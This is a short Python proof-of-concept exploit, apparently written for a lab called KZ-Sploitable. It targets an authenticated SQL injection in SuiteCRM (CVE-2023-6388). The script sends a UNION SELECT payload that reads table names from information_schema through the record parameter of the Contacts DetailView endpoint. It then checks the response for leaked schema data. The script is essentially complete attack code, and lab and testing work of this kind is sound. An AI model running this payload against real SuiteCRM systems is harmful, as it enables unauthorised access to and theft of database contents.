#!/usr/bin/env python3
"""SuiteCRM SQL Injection PoC (CVE-2023-6388)

Demonstrates authenticated SQL injection in SuiteCRM.
Educational proof-of-concept for KZ-Sploitable lab.
"""

import sys
import urllib.request
import urllib.parse


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://kz-suitecrm:80"
    print(f"[*] Target: {target}")
    print(f"[*] CVE: CVE-2023-6388")
    print(f"[*] Type: Authenticated SQL Injection")
    print()

    payload = "1' UNION SELECT table_name,2,3 FROM information_schema.tables-- -"
    url = f"{target}/index.php?module=Contacts&action=DetailView&record={urllib.parse.quote(payload)}"

    print(f"[+] Sending SQLi payload...")
    print(f"[+] Target endpoint: /index.php?module=Contacts&action=DetailView")
    print()

    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "KZ-Sploitable-PoC/1.0")
        req.add_header("Cookie", "PHPSESSID=poc_session_placeholder")

        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            print(f"[+] Response status: {resp.status}")
            print(f"[+] Response body (first 500 chars):")
            print(body[:500])

            if "information_schema" in body.lower() or "table_name" in body.lower():
                print()
                print("[+] SUCCESS: SQL injection confirmed -- database schema leaked")
            else:
                print()
                print("[*] Response received but SQLi output not detected in HTML")

    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        print(f"[!] Connection failed: {e.reason}")
    except Exception as e:
        print(f"[!] Error: {e}")

    print()
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
